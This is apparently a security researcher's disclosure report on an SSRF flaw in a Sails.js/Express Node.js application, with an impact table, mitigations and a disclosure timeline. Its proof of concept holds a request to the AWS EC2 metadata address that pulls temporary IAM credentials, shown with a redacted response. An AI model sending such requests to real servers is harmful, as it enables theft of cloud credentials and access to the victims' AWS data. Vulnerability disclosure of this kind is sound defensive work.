# 🛡️ Vulnerability Report – SSRF Leading to AWS EC2 Metadata Credential Leak (0-day) 🚨

## 📋 Summary

A Server-Side Request Forgery (**SSRF**) vulnerability was discovered in a Node.js application built with **Sails.js** and **Express** frameworks. This vulnerability allows attackers to send unauthorized HTTP requests from the server to internal resources, including the AWS EC2 Metadata Service at `169.254.169.254`.

Exploitation results in disclosure of temporary AWS credentials (`AccessKeyId`, `SecretAccessKey`, and `Token`), potentially allowing access to AWS resources depending on the assigned IAM role.

This vulnerability is considered a **0-day**, discovered independently and unpatched at time of reporting.

---

## ⚙️ Technical Details

| **Attribute**      | **Details**                                           |
| ------------------ | ----------------------------------------------------- |
| Vulnerability Type | SSRF (Server-Side Request Forgery) 🔗                 |
| Platform           | Node.js (TypeScript), Sails.js, Express 💻            |
| Impact             | Disclosure of AWS EC2 Metadata credentials 🔐         |
| Exploitation       | Server-side HTTP requests to EC2 metadata endpoint 🌐 |
| Severity           | Critical ⚠️ (CVSS 9.0+)                               |
| Status             | 0-day — unpatched and unknown 🆕                      |

---

## 🔬 Proof of Concept (PoC)

<img width="1920" height="954" alt="bug6" src="https://github.com/user-attachments/assets/f5b8334f-6718-4ebb-b2d0-b860c18a8b63" />


```http
GET http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance HTTP/1.1
Host: <target-host>
User-Agent: Mozilla/5.0 (compatible)
```

**Response (redacted):**

```json
{
  "Code": "Success",
  "AccessKeyId": "ASIAXXXXXXXX",
  "SecretAccessKey": "kQDZcJXXXXXXXXXX",
  "Token": "IQoJb3JpZ2luX2VjEIr/////...",
  "Expiration": "2025-07-19T15:41:24Z"
}
```

---

## 💥 Impact

| **Potential Actions**               | **Description**                       |
| ----------------------------------- | ------------------------------------- |
| Access S3 buckets 📦                | List/download stored data             |
| Invoke Lambda functions ⚙️          | Execute cloud functions               |
| Query or modify DynamoDB tables 🗄️ | Access or change database entries     |
| Other AWS API actions 🔄            | As permitted by the assigned IAM role |

Consequences include unauthorized data access, exfiltration, service disruption, or privilege escalation 🚨.

---

## 🛠️ Recommendations

| **Mitigation**      | **Details**                                             |
| ------------------- | ------------------------------------------------------- |
| Input Validation ✅  | Sanitize and validate user inputs used in HTTP requests |
| Allowlist 🔒        | Restrict outgoing server HTTP requests to trusted URLs  |
| Network Controls 🛑 | Block access to `169.254.169.254` via firewall and OS   |
| Use IMDSv2 🔐       | Require IMDSv2 tokens for metadata access on EC2        |
| Audit Code 🔍       | Review server-side HTTP calls for SSRF                  |

---

## 📅 Disclosure Timeline

| **Date**             | **Event**                         |
| -------------------- | --------------------------------- |
| July 19, 2025 🗓️    | Vulnerability Discovered          |
| Multiple attempts 📧 | Contacted vendor, no response     |
| Current ⏳            | Awaiting vendor patch or response |

---

## 📝 Notes

This vulnerability resembles **CVE-2025-2828** but might be a distinct instance due to application specifics.

---

## 🙌 Credits

Discovered and reported by [@B1ack4sh](https://github.com/B1ack4sh)

---


